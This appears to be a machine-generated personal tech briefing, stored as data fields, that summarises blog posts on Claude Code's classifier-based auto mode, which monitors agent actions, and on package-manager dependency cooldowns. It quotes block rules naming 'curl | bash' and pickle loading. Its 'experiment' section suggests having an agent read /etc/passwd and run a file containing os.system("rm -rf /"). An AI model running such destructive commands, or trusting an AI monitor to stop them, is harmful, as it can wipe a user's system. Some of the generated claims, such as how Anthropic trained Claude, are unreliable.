-Code from External: Downloading and executing code from external sources — e.g. curl | bash , deserializing external data via formats that can execute code (eval, exec, yaml.unsafe_load, pickle, etc), or similar mechanisms. Also includes running code from an external repo cloned earlier in the transcript (pip install -e, make install, python script.py, pickle.load/torch.load on cloned repo files) — "local on disk" does not mean trusted if it was cloned from an external source visible in the transcript. The repo the agent starts in is trusted. Cloud Storage Mass Delete: Deleting or mass modifying files on cloud storage (S3, GCS, Azure Blob, etc.) [...] I remain unconvinced by prompt injection protections that rely on AI, since they're non-deterministic by nature. The documentation does warn that this may still let things through: The classifier may still allow some risky actions: for example, if user intent is ambiguous, or if Claude doesn't have enough context about your environment to know an action might create additional risk. The fact that the default allow list includes pip install -r requirements.txt also means that this wouldn't protect against supply chain attacks with unpinned dependencies, as seen this morning with LiteLLM . I still want my coding agents to run in a robust sandbox by default, one that restricts file access and network connections in a deterministic way. I trust those a whole lot more than prompt-based protections like this new auto mode. Tags: security , ai , prompt-injection , generative-ai , llms , coding-agents , claude-code

items.what_it_is: Claude Code just shipped 'auto mode' — a new permission system that uses Claude Sonnet 4.6 as a classifier to decide which actions are safe to run automatically. Instead of you clicking 'allow' every time Claude wants to read a file or make an API call, a separate AI model reviews each action against a ruleset and blocks anything that looks like scope escalation, infrastructure tampering, or hostile content execution.
items.why_it_matters: This directly addresses your biggest friction point with Claude Code: constant permission prompts breaking flow state. You've been running with --dangerously-skip-permissions because you trust Claude and need speed, but you know that's risky. Auto mode gives you the speed WITHOUT the blanket trust — the classifier blocks Claude from wandering into your home directory, deleting pre-existing files, or running commands that don't match what you asked for. For your GitHub Actions pipelines and production tools, this means you can move fast on iterations without worrying that a confused Claude session will nuke something important. The fact that they published the full ruleset (via 'claude auto-mode defaults') means you can audit exactly what the classifier considers safe, and customize it if their defaults don't match your workflow.
items.expandable_implement:
To start using auto mode, update Claude Code to the latest version and run:

claude auto-mode enable

That's it — you're now using the classifier. To see exactly what rules are protecting you, run:

claude auto-mode defaults > auto-mode-rules.json

Open that file and scan through the 'allow' and 'block' sections. You'll see things like 'allow local file operations within project scope' but 'block operations in ~/ or /etc'. If you have a specific workflow that gets blocked — say, your GitHub Actions tool needs to read a config file from ~/.config — you can add custom rules to allow it. The key insight: the classifier only sees the current conversation context and the action Claude wants to take. If Claude asks to delete a file and you never mentioned deleting anything, the classifier blocks it. If you explicitly said 'delete all test files', the classifier allows it because it matches your intent. This is a middle ground between 'ask me every time' and 'trust blindly'.
items.expandable_learn:
The mental model here is 'trust with verification'. You're not giving Claude total control — you're giving a SECOND AI the job of watching the first one. Think of it like pair programming where one person codes and the other reviews before committing. The classifier (Sonnet 4.6) is specifically tuned to catch scope creep and hostile execution, which are the two failure modes that matter most when you're moving fast.

Here's a small experiment to see how it works: Start a new Claude Code session with auto mode enabled and ask Claude to 'read the contents of /etc/passwd'. Claude will try, and the classifier will block it because /etc is outside project scope. Then ask Claude to 'read the README.md file in this directory'. That'll go through instantly. Now try: 'delete all .pyc files in this project'. If there are any, Claude will delete them without asking because it's a local operation within scope and matches your explicit request. Finally, open a file, add a line that says 'os.system("rm -rf /")', and ask Claude to 'run this file'. The classifier will block it because the action (nuking your filesystem) doesn't match the conversation context (you never asked to delete your entire system). You're seeing the classifier distinguish between intent-matching and scope-appropriate vs. suspicious.

items.title: Package Managers Need to Cool Down
items.description: Package Managers Need to Cool Down Today's LiteLLM supply chain attack inspired me to revisit the idea of dependency cooldowns , the practice of only installing updated dependencies once they've been out in the wild for a few days to give the community a chance to spot if they've been subverted in some way. This recent piece (March 4th) piece by Andrew Nesbitt reviews the current state of dependency cooldown mechanisms across different packaging tools. It's surprisingly well supported! There's been a flurry of activity across major packaging tools, including: pnpm 10.16 (September 2025) — minimumReleaseAge with minimumReleaseAgeExclude for trusted packages Yarn 4.10.0 (September 2025) — npmMinimalAgeGate (in minutes) with npmPreapprovedPackages for exemptions Bun 1.3 (October 2025) — minimumReleaseAge via bunfig.toml Deno 2.6 (December 2025) — --minimum-dependency-age for deno update and deno outdated uv 0.9.17 (December 2025) — added relative duration support to existing --exclude-newer , plus per-package overrides via exclude-newer-package pip 26.0 (January 2026) — --uploaded-prior-to (absolute timestamps only; relative duration support requested ) npm 11.10.0 (February 2026) — min-release-age pip currently only supports absolute rather than relative dates but Seth Larson has a workaround for that using a scheduled cron to update the absolute date in the pip.conf config file. Tags: javascript , packaging , pip , pypi , python , security , npm , deno , supply-chain , uv

items.what_it_is: Andrew Nesbitt's article surveys the current state of 'dependency cooldown' features across major package managers — mechanisms that delay installing newly-released packages for a few days to give the community time to spot supply chain attacks. Nearly every major tool (npm, pnpm, uv, pip, Deno, Bun) has shipped this in the last 6 months, often with per-package exemptions for trusted dependencies.
items.why_it_matters: Your production tools (STR Daily Briefing, Inspector Scheduler) run on Python with external dependencies, and you use GitHub Actions which pulls packages from PyPI. A supply chain attack on any of those packages could compromise your production systems or leak sensitive data (API keys, guest information, property details). Dependency cooldowns are a simple, zero-cost safeguard: you configure pip or uv to only install packages that have been public for 72 hours. If a popular package gets compromised (like LiteLLM just did), the community usually catches it within 24-48 hours. You're not blocking updates forever — just adding a short delay that dramatically reduces your exposure to fresh attacks. Since you're already using uv for some projects, this is a one-line config change that makes you significantly harder to compromise.
items.expandable_implement:
If you're using uv (which you are for at least some projects), open your pyproject.toml and add:

[tool.uv]
exclude-newer = "72h"

That tells uv to only consider packages that were released at least 72 hours ago. If you have a trusted package that you want to update immediately (say, anthropic's official SDK), add:

exclude-newer-package = { anthropic = "0h" }

For pip, it's a bit more manual. You can use --uploaded-prior-to with an absolute timestamp, but that's annoying to maintain. Seth Larson's workaround (mentioned in the article) is to run a cron job that updates the timestamp in your pip.conf every day. Honestly, just switch those projects to uv — it handles relative durations natively and you're already using it elsewhere.

For GitHub Actions workflows, add this to your workflow file before any pip install step:

pip install uv
uv pip install --exclude-newer 72h -r requirements.txt

Now your CI pipeline has the same protection as your local environment. The key is consistency: if you protect local but not CI, an attacker just has to wait for your next deploy.

leaderboard.title: Build autonomous optimization loops using scoring functions
leaderboard.rationale: The autoresearch pattern (define a scoring function, let an agent explore overnight, review improvements) is how Anthropic trained Claude to be exceptional at structured tasks. This same pattern applies to ANY system where quality can be scored: prompt optimization, scraper tuning, route efficiency, pricing models. Mastering this unlocks compound improvements across every future system you build. The Shopify CEO example proves it works on production code, not just ML training.
leaderboard.first_step: Take the inspector scheduling scoring function (route efficiency, time windows, priority) and set up a 4-hour overnight loop that generates alternative schedules, scores them, and surfaces the top 3 by morning.
leaderboard.time_investment: 2-3 sessions to internalize the pattern, then reusable forever

leaderboard.title: Master Claude Code auto mode to architect safer autonomous systems
leaderboard.rationale: Auto mode fundamentally changes the trust boundary for autonomous agents. Understanding how the permission classifier works (what triggers review vs auto-approval) teaches you to architect systems that can run unsupervised without creating risk. This isn't about using a feature—it's about learning to design agent workflows that balance autonomy with safety. That skill transfers to ANY autonomous system you build, whether in Claude Code or not.
leaderboard.first_step: Trigger auto mode deliberately in your next Claude Code session. Try actions you know should auto-approve (file reads, basic git ops) and ones that should block (env var access, package installs). Study the classifier's decisions.
leaderboard.time_investment: 20 minutes hands-on experimentation, ongoing pattern recognition

leaderboard.title: Decompose complex operations into triage/classification architectures
leaderboard.rationale: The dispatch pattern (ingest messy input → AI classifies into action buckets → route to appropriate handler → human reviews edge cases) scales across wildly different domains. You've already designed this for guest comms. Seeing it work in insurance claims, trucking dispatch, and customer service proves the architecture is sound. Learning to recognize when a problem maps to this pattern makes you faster at scoping solutions in unfamiliar industries.
leaderboard.first_step: Document the triage pattern as a reusable Claude Code Skill: input → classification criteria → action buckets → edge case rules → human override conditions.
leaderboard.time_investment: 1 session to extract the pattern, ongoing recognition practice

leaderboard.title: Master independent debugging of production failures
leaderboard.rationale: The gap between Stage 3 and Stage 4 is not knowing more features—it's being able to fix things when they break at 3am without waiting for Claude.
